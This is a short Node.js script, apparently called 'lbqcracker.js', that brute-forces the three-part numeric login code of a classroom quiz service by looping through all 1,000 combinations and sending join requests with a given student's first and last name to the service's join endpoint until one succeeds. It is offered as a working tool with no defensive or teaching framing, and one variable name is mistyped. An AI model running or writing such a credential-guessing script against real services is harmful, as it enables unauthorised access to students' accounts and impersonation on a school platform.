const classCode = process.argv[2];
const fname = process.argv[3];
const lname = process.argv[4];
const code = process.argv[5];
const schoolCode = process.argv[6];
const startCode = 65793;
if (!classCode || !fname || !lname || !code || !schoolcode) {
  console.log('INVALID USAGE. Usage: node lbqcracker.js <classcode> <first name> <last name> <classid> <schoolid>');
  process.exit(1);
}
if (code === undefined) {
  console.log("Invalid classcode");
  process.exit(1);
}
let auth = 0
let breaker = false
let password = [0,0,0];
async function main() {
  for (let number = 0;number<10;number++) {
  if (breaker) {break}
  for (let color = 0; color< 10 ; color++) {
  if (breaker) {break}
  for (let thing = 0; thing < 10; thing++) {
    console.log(String(number)+','+String(color)+','+String(thing));
    auth = startCode + (number * (65536)) + (color * 256) + thing;
    const form = new FormData();
    form.append("postData", JSON.stringify({
        version: 0,
        caps: 0,
        schoolId: schoolCode,
        classId: code,
        info: {
            auth: auth,
            joinText: fname,
            joinText2: lname,
            accessCode: classCode
        }
    }));
    const response = await fetch('https://www.lbq.org/service/SAQuSetService/join',{
      method: 'POST',
      body: form
    })
    const data = await response.json();
    if (data["success"]) {
      breaker = true
      password = [number,color,thing]
      break;
    }
  }
  }
  }
  console.log(password);
}
main();
